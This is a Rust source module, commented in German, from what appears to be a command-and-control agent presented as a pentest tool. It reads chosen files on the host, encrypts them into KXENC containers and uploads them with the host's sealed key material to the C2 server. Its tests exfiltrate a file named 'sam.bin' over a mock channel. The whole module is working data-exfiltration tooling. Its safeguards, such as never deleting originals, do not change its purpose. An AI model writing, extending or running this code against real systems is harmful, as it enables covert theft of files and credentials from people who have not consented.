//! Datei-Exfiltration als KXENC-Container (Issue #31).
//!
//! Der Agent liest eine Datei, versiegelt sie mit dem Master-Key seines
//! Hosts in einen KXENC-Container und meldet den Container an den C2. Der
//! Container wird **neben** das Original geschrieben (`<name>.kxenc`) — das
//! Original bleibt unangetastet. Das Löschen des Originals wäre
//! Ransomware-Verhalten und ist für einen autorisierten Pentest kein Default.
//!
//! Ohne Server-Schlüssel (`--server-key`) gibt es keinen Master-Key und
//! damit keine Versiegelung: Datei-Beute geht **nicht** im Klartext an den
//! C2 — jede Datei zählt dann als verloren. Das ist der Unterschied zur
//! Secret-Exfiltration, die der Betreiber bewusst auch ohne Schlüssel
//! fahren darf.

use std::path::PathBuf;

use kx_core::c2::FileUpload;
use kx_core::codec::{b64_decode, b64_encode};
use tracing::{error, info};

use crate::c2::C2Port;
use crate::hostkey::KeySealer;

/// Das Ergebnis der Datei-Exfiltration.
///
/// Wie bei der Beute zählt die **zugestellte** Datei, nicht die vorbereitete:
/// ein Upload, der den C2 nicht erreicht, ist verlorene Arbeit.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub struct DateiBilanz {
    /// Die Container, die der Server angenommen hat.
    pub uebertragen: usize,
    /// Die Dateien, die nicht ankamen — nicht lesbar, nicht versiegelbar
    /// oder vom C2 abgewiesen.
    pub verloren: usize,
}

/// Exfiltriert die genannten Dateien des eigenen Hosts.
///
/// Je Datei: lesen → mit dem Host-Master-Key versiegeln → `<name>.kxenc`
/// neben das Original schreiben → Container an den C2 melden. Ein
/// Fehlschlag auf dem Weg zählt als Verlust und bricht die übrigen Dateien
/// nicht ab.
pub fn exfiltriere_dateien(
    port: &dyn C2Port,
    sealer: Option<&KeySealer>,
    host_id: &str,
    pfade: &[PathBuf],
) -> DateiBilanz {
    let mut bilanz = DateiBilanz::default();
    if pfade.is_empty() {
        return bilanz;
    }

    // Ohne Schlüssel keine Datei-Exfiltration — der Container braucht den
    // Master-Key des Hosts, und ein Klartext-Container wäre ein Widerspruch.
    let Some(sealer) = sealer else {
        error!(
            "{} Dateien nicht exfiltriert: ohne --server-key gibt es keinen Master-Key",
            pfade.len()
        );
        bilanz.verloren = pfade.len();
        return bilanz;
    };
    let Some(key) = sealer.schluessel_fuer(host_id) else {
        error!(
            "{} Dateien nicht exfiltriert: kein Schlüsselmaterial",
            pfade.len()
        );
        bilanz.verloren = pfade.len();
        return bilanz;
    };

    for pfad in pfade {
        match exfiltriere_eine(port, &key, sealer.kex(), host_id, pfad) {
            Ok(()) => {
                info!("Datei exfiltriert: {}", pfad.display());
                bilanz.uebertragen += 1;
            }
            Err(grund) => {
                error!("Datei {} nicht exfiltriert: {grund}", pfad.display());
                bilanz.verloren += 1;
            }
        }
    }
    bilanz
}

/// Der Weg einer einzelnen Datei. Jeder Schritt nennt seinen Fehler — die
/// Bilanz zählt ihn, das Journal benennt ihn.
fn exfiltriere_eine(
    port: &dyn C2Port,
    key: &crate::hostkey::SealedHostKey,
    kex: kx_core::kex::KexId,
    host_id: &str,
    pfad: &PathBuf,
) -> Result<(), String> {
    let inhalt = std::fs::read(pfad).map_err(|e| format!("nicht lesbar: {e}"))?;
    let filename = pfad
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .ok_or_else(|| "kein Dateiname".to_string())?;

    let container = kx_core::kxenc::seal(&inhalt, &key.roh, kex)
        .map_err(|e| format!("Versiegelung fehlgeschlagen: {e}"))?;
    let file_id = kx_core::kxenc::file_id_hex(&container)
        .map_err(|e| format!("Container ohne lesbare Kennung: {e}"))?;

    // Neben das Original, nie darüber: der Operator, der nie kommt, verliert
    // sonst die Daten des Ziels (ISSUE-15, Befund 5).
    let neben = PathBuf::from(format!("{}.kxenc", pfad.display()));
    std::fs::write(&neben, &container).map_err(|e| format!("Container nicht schreibbar: {e}"))?;

    port.melde_datei(&FileUpload {
        host_id: host_id.to_string(),
        file_id,
        filename,
        plain_size: inhalt.len() as u64,
        container: b64_encode(&container),
        // Der Schluessel reist mit der Datei — ein neuer Agent-Lauf darf
        // sie nicht unlesbar machen (Issue #70).
        sealed_master: key.sealed_master.clone(),
    })
    .map_err(|e| format!("Upload fehlgeschlagen: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::c2::C2Port;
    use kx_core::c2::transport::TransportError;
    use kx_core::c2::{RegisterRequest, SecretUpload, Task, TaskResultRequest};
    use std::sync::Mutex;

    /// Ein Port, der die Container mitschreibt — die Wirkung zaehlt, nicht
    /// der Aufruf.
    struct DateiPort {
        uploads: Mutex<Vec<FileUpload>>,
        fehler: bool,
    }

    impl DateiPort {
        fn neu(fehler: bool) -> Self {
            DateiPort {
                uploads: Mutex::new(Vec::new()),
                fehler,
            }
        }
    }

    impl C2Port for DateiPort {
        fn registriere_host(&self, _req: &RegisterRequest) -> Result<(), TransportError> {
            Ok(())
        }
        fn melde_beute(&self, _upload: &SecretUpload) -> Result<(), TransportError> {
            Ok(())
        }
        fn hole_tasks(&self) -> Result<Vec<Task>, TransportError> {
            Ok(Vec::new())
        }
        fn melde_task_ergebnis(&self, _r: &TaskResultRequest) -> Result<(), TransportError> {
            Ok(())
        }
        fn melde_datei(&self, upload: &FileUpload) -> Result<(), TransportError> {
            self.uploads.lock().unwrap().push(upload.clone());
            if self.fehler {
                return Err(TransportError::Http("keine Datei".into()));
            }
            Ok(())
        }
    }

    fn sealer() -> KeySealer {
        let mut rng = rand_core::OsRng;
        let bundle = kx_core::hostkey::ServerKeyBundle::generate(
            kx_core::kex::KexId::HybridX25519MlKem768,
            &mut rng,
        );
        let oeffentlich = bundle.public().expect("oeffentlicher Schluessel");
        KeySealer::from_server_key(oeffentlich.decode().expect("dekodierter Schluessel"))
    }

    fn temp_datei(name: &str, inhalt: &[u8]) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("kx-datei-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).expect("Testverzeichnis");
        let pfad = dir.join(name);
        std::fs::write(&pfad, inhalt).expect("Originaldatei");
        pfad
    }

    /// Der ganze Weg: gelesen, versiegelt, neben das Original geschrieben,
    /// gemeldet — und der Operator bekommt den Klartext zurueck.
    #[test]
    fn der_container_liegt_neben_dem_original_und_traegt_den_klartext_nicht() {
        let sealer = sealer();
        let key = sealer.schluessel_fuer("192.168.1.100").expect("Schluessel");
        let original = b"KXENC-DATEI-TEST-INHALT-0123456789-geheim";
        let pfad = temp_datei("sam.bin", original);
        let port = DateiPort::neu(false);

        let bilanz = exfiltriere_dateien(&port, Some(&sealer), "192.168.1.100", &[pfad.clone()]);
        assert_eq!(bilanz.uebertragen, 1);
        assert_eq!(bilanz.verloren, 0);

        // Das Original ist unangetastet.
        assert_eq!(std::fs::read(&pfad).expect("Original"), original);

        // Der Container liegt daneben — nicht im Original.
        let neben = PathBuf::from(format!("{}.kxenc", pfad.display()));
        let abgelegt = std::fs::read(&neben).expect("Container neben dem Original");
        assert!(
            !abgelegt.windows(original.len()).any(|f| f == original),
            "der Klartext steht im Container"
        );

        // Die Meldung traegt denselben Container — und der Master-Key des
        // Hosts oeffnet ihn.
        let uploads = port.uploads.lock().unwrap();
        assert_eq!(uploads.len(), 1);
        let upload = &uploads[0];
        assert_eq!(upload.host_id, "192.168.1.100");
        assert_eq!(upload.filename, "sam.bin");
        assert_eq!(upload.plain_size, original.len() as u64);
        assert_eq!(
            upload.sealed_master, key.sealed_master,
            "die Datei traegt ihr Schluesselmaterial nicht selbst"
        );
        let container = b64_decode(&upload.container).expect("Base64");
        assert_eq!(container, abgelegt);
        assert_eq!(
            upload.file_id,
            kx_core::kxenc::file_id_hex(&container).expect("Kennung")
        );
        let zurueck = kx_core::kxenc::open(&container, &key.roh).expect("Entschluesselung");
        assert_eq!(
            zurueck, original,
            "der Operator bekommt die Datei nicht zurueck"
        );

        std::fs::remove_dir_all(pfad.parent().expect("Verzeichnis")).ok();
    }

    /// Ohne Server-Schluessel geht keine Datei raus — und keine zaehlt als
    /// Erfolg. Ein Klartext-Container darf nicht entstehen.
    #[test]
    fn ohne_server_schluessel_zaehlt_jede_datei_als_verloren() {
        let pfad = temp_datei("sam.bin", b"inhalt");
        let port = DateiPort::neu(false);
        let bilanz = exfiltriere_dateien(&port, None, "192.168.1.100", &[pfad.clone()]);
        assert_eq!(bilanz.uebertragen, 0);
        assert_eq!(bilanz.verloren, 1);
        assert!(port.uploads.lock().unwrap().is_empty());
        let neben = PathBuf::from(format!("{}.kxenc", pfad.display()));
        assert!(
            !neben.exists(),
            "ohne Schluessel wurde ein Container geschrieben"
        );
        std::fs::remove_dir_all(pfad.parent().expect("Verzeichnis")).ok();
    }

    /// Ein abgewiesener Upload ist verlorene Arbeit — der Container liegt
    /// zwar auf der Platte, der Operator hat ihn aber nicht.
    #[test]
    fn ein_abgewiesener_upload_zaehlt_als_verloren() {
        let sealer = sealer();
        let pfad = temp_datei("sam.bin", b"inhalt");
        let port = DateiPort::neu(true);
        let bilanz = exfiltriere_dateien(&port, Some(&sealer), "192.168.1.100", &[pfad.clone()]);
        assert_eq!(bilanz.uebertragen, 0);
        assert_eq!(bilanz.verloren, 1);
        std::fs::remove_dir_all(pfad.parent().expect("Verzeichnis")).ok();
    }

    /// Eine nicht lesbare Datei bricht die uebrigen nicht ab.
    #[test]
    fn eine_kaputte_datei_bricht_die_uebrigen_nicht_ab() {
        let sealer = sealer();
        let gut = temp_datei("gut.bin", b"inhalt");
        let kaputt = gut.parent().expect("Verzeichnis").join("gibt-es-nicht.bin");
        let port = DateiPort::neu(false);
        let bilanz = exfiltriere_dateien(
            &port,
            Some(&sealer),
            "192.168.1.100",
            &[kaputt, gut.clone()],
        );
        assert_eq!(bilanz.uebertragen, 1);
        assert_eq!(bilanz.verloren, 1);
        std::fs::remove_dir_all(gut.parent().expect("Verzeichnis")).ok();
    }
}
